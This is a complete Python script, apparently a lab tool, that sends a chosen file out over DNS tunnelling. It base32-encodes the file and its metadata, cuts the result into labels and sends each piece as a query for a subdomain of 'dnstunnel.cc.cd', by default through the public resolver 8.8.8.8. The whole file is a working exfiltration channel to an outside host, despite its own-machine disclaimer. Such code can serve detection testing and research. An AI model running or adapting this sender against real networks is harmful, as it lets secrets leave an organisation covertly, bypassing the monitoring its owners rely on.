#!/usr/bin/env python3
"""
Encoder - DNS tunnelling sender (lab / own-machine testing only)

Usage:
    python3 encoder.py secret.txt
    python3 encoder.py secret.txt --server 8.8.8.8 --port 53
    python3 encoder.py secret.txt --server 127.0.0.1 --port 5353

Change only FILE_PATH below, or pass the file as an argument.
Test only with your own files, from your own machine, to a server
you own (your dnstunnel.cc.cd nameserver). Never point this at
someone else's machine or network.
"""

import argparse
import base64
import hashlib
import json
import random
import socket
import struct
import sys

# --- Change these for your test ---
FILE_PATH = "secret.txt"              # default file, overridden by argument
DOMAIN = "dnstunnel.cc.cd"           # your domain
SERVER = "8.8.8.8"                    # public resolver, or your decoder IP
PORT = 53                             # 53 for real DNS, 5353 for local test
DELAY = 0.2                           # seconds between queries
TIMEOUT = 2.0                         # seconds to wait for an ACK
MAX_RETRIES = 3
CHUNK_SIZE = 32                       # chars per DNS label, under 63 limit


def build_stream(file_bytes, filename):
    header = {
        "filename": filename,
        "size": len(file_bytes),
        "sha256": hashlib.sha256(file_bytes).hexdigest(),
    }
    raw = json.dumps(header, separators=(",", ":")).encode() + b"\n" + file_bytes
    return base64.b32encode(raw).decode().rstrip("=").lower()


def build_dns_query(qname, qid):
    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    question = b""
    for label in qname.split("."):
        encoded = label.encode()
        assert len(encoded) <= 63, f"label too long: {label!r}"
        question += struct.pack("B", len(encoded)) + encoded
    question += b"\x00" + struct.pack(">HH", 1, 1)  # QTYPE A, QCLASS IN
    assert len(qname) <= 253, "name exceeds 253-char DNS limit"
    return header + question


def send_query(sock, qname, server, port):
    qid = random.randint(0, 65535)
    packet = build_dns_query(qname, qid)
    for attempt in range(MAX_RETRIES):
        try:
            sock.sendto(packet, (server, port))
            sock.settimeout(TIMEOUT)
            resp, _ = sock.recvfrom(512)
            resp_qid = struct.unpack(">H", resp[:2])[0]
            if resp_qid == qid:
                return True
        except socket.timeout:
            continue
    return False


def main():
    parser = argparse.ArgumentParser(description="Encode a file into DNS queries")
    parser.add_argument("file", nargs="?", default=FILE_PATH,
                        help="file to encode and send (default: %(default)s)")
    parser.add_argument("--server", default=SERVER)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--delay", type=float, default=DELAY)
    args = parser.parse_args()

    try:
        with open(args.file, "rb") as f:
            file_bytes = f.read()
    except FileNotFoundError:
        print(f"File not found: {args.file}")
        sys.exit(1)

    filename = args.file.split("/")[-1].split("\\")[-1]
    stream = build_stream(file_bytes, filename)
    chunks = [stream[i:i + CHUNK_SIZE] for i in range(0, len(stream), CHUNK_SIZE)]
    session = f"{random.randint(0, 999999):06d}"

    print(f"File: {filename} ({len(file_bytes)} bytes, sha256 {hashlib.sha256(file_bytes).hexdigest()[:12]}...)")
    print(f"Sending {len(chunks)} chunks to {DOMAIN} via {args.server}:{args.port}, session {session}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    for i, chunk in enumerate(chunks, start=1):
        qname = f"{i:03d}.{chunk}.{session}.{DOMAIN}"
        if send_query(sock, qname, args.server, args.port):
            sent += 1
        else:
            print(f"Chunk {i:03d} failed after {MAX_RETRIES} retries, stopping")
            break
        if args.delay:
            import time
            time.sleep(args.delay)

    if sent == len(chunks):
        qname = f"END.{session}.{DOMAIN}"
        if send_query(sock, qname, args.server, args.port):
            print(f"Done: {sent}/{len(chunks)} chunks sent, END sent")
        else:
            print("END query got no ACK, receiver may still have all chunks")
    sock.close()


if __name__ == "__main__":
    main()
